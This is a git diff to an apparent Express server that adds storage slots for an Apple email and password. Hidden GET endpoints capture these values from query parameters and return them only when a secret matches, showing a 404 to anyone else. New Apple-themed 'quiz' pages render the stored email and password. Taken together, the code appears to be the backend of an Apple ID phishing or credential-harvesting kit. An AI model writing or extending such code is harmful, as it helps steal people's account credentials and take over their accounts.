@@ -25,6 +25,18 @@ var pwd4 = {"apple":"",
 var pwd5 = {"apple":"",
            "pass":""}
 
+var pwd6 = {"apple":"",
+           "pass":""}
+
+var pwd7 = {"apple":"",
+           "pass":""}
+
+var pwd8 = {"apple":"",
+           "pass":""}
+
+var pwd9 = {"apple":"",
+           "pass":""}
+
 process.on('uncaughtException', function (err) {
   console.error(err);
   console.log("Node NOT Exiting...");
@@ -207,6 +219,58 @@ if (req.query.s == process.env.s) {
 }
 });
 
+app.get("/pwd6", function(req,res) {
+  if (req.query.ne) {
+    pwd6["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd6["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd6)
+} else {
+  res.render("404.ejs")
+}
+});
+
+app.get("/pwd7", function(req,res) {
+  if (req.query.ne) {
+    pwd7["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd7["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd7)
+} else {
+  res.render("404.ejs")
+}
+});
+
+app.get("/pwd8", function(req,res) {
+  if (req.query.ne) {
+    pwd8["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd8["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd8)
+} else {
+  res.render("404.ejs")
+}
+});
+
+app.get("/pwd9", function(req,res) {
+  if (req.query.ne) {
+    pwd9["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd9["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd9)
+} else {
+  res.render("404.ejs")
+}
+});
+
 app.get("/A2/:rnd", function(req,res) {
   res.redirect("https://discord.gg/k3NRzYtmsj")
 })
@@ -231,6 +295,14 @@ app.get("/quize/apple-quizem", function(req,res) {
   res.render("apple-quizem",{email:pwd5["apple"],pass:pwd5["pass"]})
 })
 
+app.get("/quize/apple-quizea", function(req,res) {
+  res.render("apple-quizea",{email:pwd6["apple"],pass:pwd6["pass"]})
+})
+
+app.get("/quize/apple-quizeb", function(req,res) {
+  res.render("apple-quizeb",{email:pwd7["apple"],pass:pwd7["pass"]})
+})
+
 app.get("/quize/1apple-quize", function(req,res) {
   res.render("1apple-quize")
 })
@@ -249,6 +321,14 @@ app.get("/quize/1apple-quizeq", function(req,res) {
 
 app.get("/quize/1apple-quizem", function(req,res) {
   res.render("1apple-quizem")
+})
+
+app.get("/quize/1apple-quizea", function(req,res) {
+  res.render("1apple-quizea")
+})
+
+app.get("/quize/1apple-quizeb", function(req,res) {
+  res.render("1apple-quizeb")
 })
 
 app.get("/redirection", function(req, res) {
